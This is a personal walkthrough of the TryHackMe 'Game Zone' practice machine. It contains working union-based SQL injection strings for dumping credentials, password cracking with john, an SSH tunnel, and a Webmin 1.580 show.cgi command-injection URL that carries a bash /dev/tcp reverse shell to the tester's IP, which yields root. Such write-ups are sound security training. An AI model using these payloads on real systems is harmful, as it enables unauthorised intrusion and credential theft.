### Gamezone

`export ip=10.10.191.147`
------------------------------------

#### Nmap

```
# Nmap 7.94SVN scan initiated Tue May  7 19:51:56 2024 as: nmap -sC -sV -oN nmap/initial 10.10.243.216
Nmap scan report for 10.10.243.216
Host is up (0.19s latency).
Not shown: 998 closed tcp ports (conn-refused)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.7 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 61:ea:89:f1:d4:a7:dc:a5:50:f7:6d:89:c3:af:0b:03 (RSA)
|   256 b3:7d:72:46:1e:d3:41:b6:6a:91:15:16:c9:4a:a5:fa (ECDSA)
|_  256 53:67:09:dc:ff:fb:3a:3e:fb:fe:cf:d8:6d:41:27:ab (ED25519)
80/tcp open  http    Apache httpd 2.4.18
|_http-server-header: Apache/2.4.18 (Ubuntu)
| http-cookie-flags: 
|   /: 
|     PHPSESSID: 
|_      httponly flag not set
|_http-title: Game Zone
Service Info: Host: 127.0.1.1; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue May  7 19:53:15 2024 -- 1 IP address (1 host up) scanned in 79.24 seconds
```

#### Initial access without sqlmap

- Found login page - try SQL injection 
    `'OR 1=1 -- -` successfull

- Using ' break the SQL syntax and we get error - try exploiting it manually
  
    `' union select 1,2,3 -- -`
  
    ![](/home/edith/pwn/vuln_machines/gamzezone/001.png)
  
    `' union select 1,version(),database() -- -`
  
    ![](/home/edith/pwn/vuln_machines/gamzezone/002.png)
  
    `' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema="db" -- -`
  
    ![](/home/edith/pwn/vuln_machines/gamzezone/003.png)
  
    `' union select 1,group_concat(column_name),3 from information_schema.columns where table_name="users" -- -`
  
    ![](/home/edith/pwn/vuln_machines/gamzezone/004.png)
  
    `'' union select 1,group_concat(username,' ',pwd),3 from users -- -`
  
    ![](/home/edith/pwn/vuln_machines/gamzezone/005.png)
  
  > Username : agent47 and Password Hash : ab5db915fc9cea6c78df88106c6500c57f2b52901ca6c0c6218f04122c3efd14

- Crack using john

```
    ┌──(edith🛸HackBox)-[~/pwn/vuln_machines/gamzezone]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash.txt --format=Raw-SHA256
Using default input encoding: UTF-8
Loaded 1 password hash (Raw-SHA256 [SHA256 256/256 AVX2 8x])
Warning: poor OpenMP scalability for this hash type, consider --fork=12
Will run 12 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
videogamer124    (agent47)     
1g 0:00:00:00 DONE (2024-05-09 21:02) 7.142g/s 21065Kp/s 21065Kc/s 21065KC/s wildboy23..vainlove                                                             
Use the "--show --format=Raw-SHA256" options to display all of the cracked passwords reliably                                                                
Session completed.                                                        
```

- Try this db password for ssh login - its successfull

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/gamzezone]
└─$ ssh agent47@10.10.191.147 
The authenticity of host '10.10.191.147 (10.10.191.147)' can't be established.
ED25519 key fingerprint is SHA256:CyJgMM67uFKDbNbKyUM0DexcI+LWun63SGLfBvqQcLA.
This key is not known by any other names.
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
Warning: Permanently added '10.10.191.147' (ED25519) to the list of known hosts.
agent47@10.10.191.147's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Fri Aug 16 17:52:04 2019 from 192.168.1.147
agent47@gamezone:~$ whoami
agent47
```

### Privilege escalation without metasploit

- On checking, we found that some services is running over port 10000 

```
agent47@gamezone:/$ ss -putln
Netid State      Recv-Q Send-Q                               Local Address:Port                                              Peer Address:Port              
udp   UNCONN     0      0                                                *:10000                                                        *:*                  
udp   UNCONN     0      0                                                *:68                                                           *:*                  
tcp   LISTEN     0      80                                       127.0.0.1:3306                                                         *:*                  
tcp   LISTEN     0      128                                              *:10000                                                        *:*                  
tcp   LISTEN     0      128                                              *:22                                                           *:*                  
tcp   LISTEN     0      128                                             :::80                                                          :::*                  
tcp   LISTEN     0      128                                             :::22                                                          :::*                  
agent47@gamezone:/$ 
```

But it was not showing in nmap result may be filtered in firewall - try exposing the service to our machine using reverse ssh tunnel

**Syntax :** ssh -L 10000:localhost:10000 <username>@<ip>

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/gamzezone]
└─$ ssh -L 10000:localhost:10000 agent47@10.10.191.147                                                                                                       
agent47@10.10.191.147's password: 
Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.4.0-159-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

109 packages can be updated.
68 updates are security updates.


Last login: Thu May  9 11:47:44 2024 from 10.17.49.246
```

Then we can access localhost:10000 

![](/home/edith/pwn/vuln_machines/gamzezone/006.png)

Webmin CMS has login screen - try using our old creds (machine creds) - Login successfull

webmin version found to be 1.580 - Check for exploit

```
──(edith🛸HackBox)-[~/pwn/vuln_machines/gamzezone]
└─$ searchsploit webmin 1.580
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Webmin 1.580 - '/file/show.cgi' Remote Command Execution (Metasploit)                                                      | unix/remote/21851.rb
Webmin < 1.920 - 'rpc.cgi' Remote Code Execution (Metasploit)                                                              | linux/webapps/47330.rb
```

Based on the comments in metasploit exploit (by using searchsploit -x <path>) - try to acces that uri with random alphanumeric characters and command on the authenticated session

![](/home/edith/pwn/vuln_machines/gamzezone/007.png)

- We can use linux reverse shell from [revshells.com](https://www.revshells.com/)
  
    `bash -i >& /dev/tcp/10.17.49.246/4444 0>&1`

- Then our URL is `http://localhost:10000/file/show.cgi/bin/adca5| bash -c 'bash -i >& /dev/tcp/10.17.49.246/4444 0>&1'|"`

- Set the netcat listerner and access the URL

```
┌──(edith🛸HackBox)-[~/pwn/vuln_machines/gamzezone]
└─$ nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.17.49.246] from (UNKNOWN) [10.10.0.222] 40192
bash: cannot set terminal process group (1225): Inappropriate ioctl for device
bash: no job control in this shell
root@gamezone:/usr/share/webmin/file/# id
id
uid=0(root) gid=0(root) groups=0(root)
root@gamezone:/usr/share/webmin/file/# 
```

**Some other way of pwning :** https://ratiros01.medium.com/tryhackme-game-zone-b41874804d4e